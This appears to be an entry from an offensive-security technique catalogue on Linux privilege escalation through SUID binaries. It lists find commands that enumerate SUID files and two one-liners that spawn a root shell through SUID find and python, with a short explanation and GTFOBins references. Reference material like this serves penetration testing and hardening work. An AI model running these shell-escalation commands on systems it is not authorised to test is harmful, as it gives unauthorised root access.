---
id: priv-001
title: "SUID Binary Abuse"
category: privilege_escalation
tags: [suid, gtfobins, binary-exploitation, linux-privesc]
platform: [linux]
commands:
  - "find / -perm -4000 -type f 2>/dev/null"
  - "find / -perm -u=s -type f 2>/dev/null"
  - "/usr/bin/find . -exec /bin/sh -p \\; -quit"
  - "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
references:
  - "https://gtfobins.github.io/"
  - "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid"
---

SUID (Set User ID) binaries execute with the permissions of the file owner rather than the invoking user, which means any SUID-root binary that allows arbitrary command execution can be leveraged to obtain a root shell. Attackers enumerate SUID binaries using `find` with the `-perm -4000` flag and cross-reference results against GTFOBins for known exploitation paths. Common exploitable binaries include `find`, `vim`, `python`, `nmap`, `bash`, and `cp`, each with documented techniques for spawning privileged shells or reading sensitive files.
